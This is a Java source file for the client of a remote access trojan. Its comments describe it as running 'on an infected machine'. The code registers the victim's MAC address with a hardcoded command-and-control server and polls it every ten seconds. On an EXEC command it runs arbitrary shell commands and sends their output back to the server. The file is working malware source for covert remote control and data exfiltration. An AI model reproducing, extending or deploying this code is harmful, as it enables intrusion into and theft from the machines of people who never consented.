package client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;
import java.util.HashMap;

import client.HTTPRequest.Callback;
import tools.Command;
import tools.ParsedCommand;

/**
 * The main thread running on an infected machine
 * 
 * @author Yohan Chalier
 *
 */
public class Client extends Thread {
	
	// Using a domain name to be able to change IP once compiled
	// private static final String SERVER_URL = "http://rat.chalier.fr";
	private static final String SERVER_URL = "http://192.168.1.19";
	
	// Client cooldown in milliseconds
	private static final int REFRESH_COOLDOWN = 10000;
	
	private HashMap<String, Command> commands;
	
	private String MAC;
	private int id;
	
	public Client() {
		commands = new HashMap<String, Command>();
		
		commands.put("PONG", new Command(){

			@Override
			public String exec(String[] args) {
				// TODO: log pong
				return null;
			}
			
		});
		
		commands.put("EXEC", new Command(){

			@Override
			public String exec(String[] args) {
				StringBuilder cmd = new StringBuilder();
				for (int i = 0; i < args.length; i++){
					cmd.append(args[i] + (i == args.length - 1 ? "" : " "));
				}
				try {
					Process p = Runtime.getRuntime().exec(cmd.toString());
					p.waitFor();
					BufferedReader reader = new BufferedReader(
							new InputStreamReader(p.getInputStream()));
					String line;
					StringBuilder output = new StringBuilder();
					while ((line = reader.readLine()) != null) {
						output.append(line + "\n");
					}
					HTTPRequest.sendAsync(
							SERVER_URL,
							"EXEC_OUT " + id + " " + output.toString(),
							new Callback(){

						@Override
						public void run(String response) {
							// TODO Auto-generated method stub
							
						}
						
					});
				} catch (IOException | InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				return null;
			}
			
		});
		
		// ADD COMMANDS HERE
	}
	
	@Override
	public void run(){
		
		try {
			MAC = getMAC();
			id = Integer.parseInt(
					HTTPRequest.send(SERVER_URL, "GETID " + MAC));
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		while (true) {
			HTTPRequest.sendAsync(SERVER_URL, "PING " + id, new Callback(){

				@Override
				public void run(String response) {
					ParsedCommand pCmd = new ParsedCommand(response);
					if (commands.containsKey(pCmd.cmd))
						commands.get(pCmd.cmd).exec(pCmd.args);
				}
				
			});
			try {
				Thread.sleep(REFRESH_COOLDOWN);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	private String getMAC() throws SocketException {
		        
        // Iterating through all network card interfaces
        for (Enumeration<NetworkInterface> ifaces =
        		NetworkInterface.getNetworkInterfaces();
        		ifaces.hasMoreElements();) {
        	
            NetworkInterface iface = (NetworkInterface) ifaces.nextElement();
            
            // We omit addresses used by VirtualBox
            if (!iface.toString().contains("Virtual")) {
            	
            	// Iterating trough all addresses of the interface
            	for (Enumeration<InetAddress> inetAddrs =
            			iface.getInetAddresses();
            			inetAddrs.hasMoreElements();) {
            		
	                InetAddress inetAddr =
	                		(InetAddress) inetAddrs.nextElement();
	                
	                if (!inetAddr.isLoopbackAddress()) {
	                	
	                	// Binary representation of MAC address
	                	byte[] mac = iface.getHardwareAddress();
	                	
	                	// Printing into a string to be returned
	                	StringBuilder sb = new StringBuilder();
	            		for (int i = 0; i < mac.length; i++) {
	            			sb.append(String.format(
	            					"%02X%s",
	            					mac[i],
	            					(i < mac.length - 1) ? "-" : ""));
	            		}
	            		
	            		return sb.toString();
	                }
	            }
            }
        }
        
        return null;
		
	}

}
